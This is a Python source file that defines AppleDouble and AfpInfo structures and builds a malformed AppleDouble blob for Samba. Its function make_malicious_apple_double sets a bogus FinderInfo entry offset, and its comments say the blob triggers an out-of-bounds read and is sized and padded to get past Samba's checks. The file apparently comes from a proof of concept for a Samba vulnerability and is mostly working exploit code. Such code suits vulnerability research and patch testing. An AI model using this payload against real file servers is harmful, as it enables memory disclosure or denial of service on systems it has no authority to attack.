"""
This file contains structure definitions for AppleDouble structures.
For more information see
https://web.archive.org/web/20180311140826/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf
"""
from ctypes import *

AFP_OFF_FinderInfo = 16
AFP_INFO_SIZE = 0x3c


class AfpInfo(Structure):
    """
    Structure definition for AfpInfo
    """
    AFP_FinderSize = 32
    # typedef struct _AfpInfo
    # {
    # 	 uint32_t      	afpi_Signature;   		/* Must be *(PDWORD)"AFP" */
    # 	 uint32_t      	afpi_Version;     		/* Must be 0x00010000 */
    # 	 uint32_t      	afpi_Reserved1;
    # 	 uint32_t      	afpi_BackupTime;  		/* Backup time for the file/dir */
    # 	 unsigned char 	afpi_FinderInfo[AFP_FinderSize];  	/* Finder Info (32 bytes) */
    # 	 unsigned char 	afpi_ProDosInfo[6];  	/* ProDos Info (6 bytes) # */
    # 	 unsigned char 	afpi_Reserved2[6];
    # } AfpInfo;
    _fields_ = [
        ("afpi_Signature", c_uint8 * 4),
        ("afpi_Version", c_uint32),
        ("afpi_Reserved1", c_uint32),
        ("afpi_BackupTime", c_uint32),
        ("afpi_FinderInfo", c_uint8 * AFP_FinderSize),
        ("afpi_ProDosInfo", c_uint8 * 6),
        ("afpi_Reserved2", c_uint8 * 6)
    ]

    def __init__(self, finder_bytes: bytes = "A" * AFP_FinderSize):
        assert len(finder_bytes) == self.AFP_FinderSize
        self.afpi_Signature[0] = ord("A")
        self.afpi_Signature[1] = ord("F")
        self.afpi_Signature[2] = ord("P")
        self.afpi_Signature[3] = 0x0
        self.afpi_Version = 0x00010000
        for i in range(self.AFP_FinderSize):
            self.afpi_FinderInfo[i] = finder_bytes[i]
        super().__init__()


class AppleDoubleEntryDescriptor(BigEndianStructure):
    """
    Structure definition for an AppleDoubleEntryDescriptor
    """
    _pack_ = 1
    _fields_ = [
        # entry_id an unsigned 32-bit number, defined what that entry is, Entry IDs
        # range from 1 to 0xFFFFFFFF, Entry ID 0 is invalid
        ("entry_id", c_uint32),

        # offset, an unsigned 32-bit number, shows the offset from the beginning of
        # the file to the beginning of the entry's data
        ("offset", c_uint32),

        # length, an unsigned 32-bit number, shows the length of the data in bytes.
        # The length can be 0
        ("length", c_uint32)
    ]


class AppleDoubleHeader(BigEndianStructure):
    """
    Structure definition for an AppleDoubleHeader
    """
    _pack_ = 1
    _fields_ = [
        ("magic", c_uint32),
        ("version", c_uint32),
        ("filler", c_uint8 * 16),
        ("number_of_entries", c_uint16)
        # Entry descriptors
    ]

    def __init__(self):
        self.magic = 0x00051607
        self.version = 0x00020000
        super().__init__()


def make_malicious_apple_double() -> bytes:
    """
    Creates a malicious AppleDouble with bogus entry offsets to trigger an OOB read
    :return:
    """
    # AppleDouble entry IDs.
    ADEID_DFORK = 1
    ADEID_RFORK = 2
    ADEID_NAME = 3
    ADEID_COMMENT = 4
    ADEID_ICONBW = 5
    ADEID_ICONCOL = 6
    ADEID_FILEI = 7
    ADEID_FILEDATESI = 8
    ADEID_FINDERI = 9
    ADEID_MACFILEI = 10
    ADEID_PRODOSFILEI = 11
    ADEID_MSDOSFILEI = 12
    ADEID_SHORTNAME = 13
    ADEID_AFPFILEI = 14
    ADEID_DID = 15

    # Private Netatalk entries
    # ADEID_PRIVDEV       = 16
    # ADEID_PRIVINO       = 17
    # ADEID_PRIVSYN       = 18
    # ADEID_PRIVID        = 19
    # ADEID_MAX           = (ADEID_PRIVID + 1)

    # These are the real ids for the private entries as stored in the adouble file
    AD_DEV = 0x80444556
    AD_INO = 0x80494E4F
    AD_SYN = 0x8053594E
    AD_ID = 0x8053567E

    # Field widths
    ADEDLEN_NAME = 255
    ADEDLEN_COMMENT = 200
    ADEDLEN_FILEI = 16
    ADEDLEN_FINDERI = 32
    ADEDLEN_FILEDATESI = 16
    ADEDLEN_SHORTNAME = 12  # length up to 8.3
    ADEDLEN_AFPFILEI = 4
    ADEDLEN_MACFILEI = 4
    ADEDLEN_PRODOSFILEI = 8
    ADEDLEN_MSDOSFILEI = 2
    ADEDLEN_DID = 4
    ADEDLEN_PRIVDEV = 8
    ADEDLEN_PRIVINO = 8
    ADEDLEN_PRIVSYN = 8
    ADEDLEN_PRIVID = 4

    header = AppleDoubleHeader()
    header.number_of_entries = 8
    b = bytes(header)

    # We must have 8 entries. If the size of the xattr does not 402, samba will delete it on read
    # (ID, LEN, OFFSET)
    entry_list = [
        # vulnerable offset, point to end of buffer 401
        (ADEID_FINDERI, 1, 401),
        (ADEID_COMMENT, ADEDLEN_COMMENT, 1),
        (ADEID_FILEDATESI, ADEDLEN_FILEDATESI, 1),
        (ADEID_AFPFILEI, ADEDLEN_AFPFILEI, 1),
        (AD_DEV, ADEDLEN_PRIVDEV, 1),
        (AD_INO, ADEDLEN_PRIVINO, 1),
        (AD_SYN, ADEDLEN_PRIVSYN, 1),
        (AD_ID, ADEDLEN_PRIVID, 1)
    ]
    assert len(entry_list) == 8
    data = b""
    for eid, length, offset in entry_list:
        desc = AppleDoubleEntryDescriptor()
        desc.entry_id = eid
        desc.offset = offset
        desc.length = length
        b += bytes(desc)
        if eid == ADEID_FINDERI:
            # We fake this to get pass a check in ad_unpack
            data += b"A" * ADEDLEN_FINDERI
        else:
            data += b"A" * length

    b += data
    assert len(b) == 402, f"len(b) == {len(b)}"
    return b
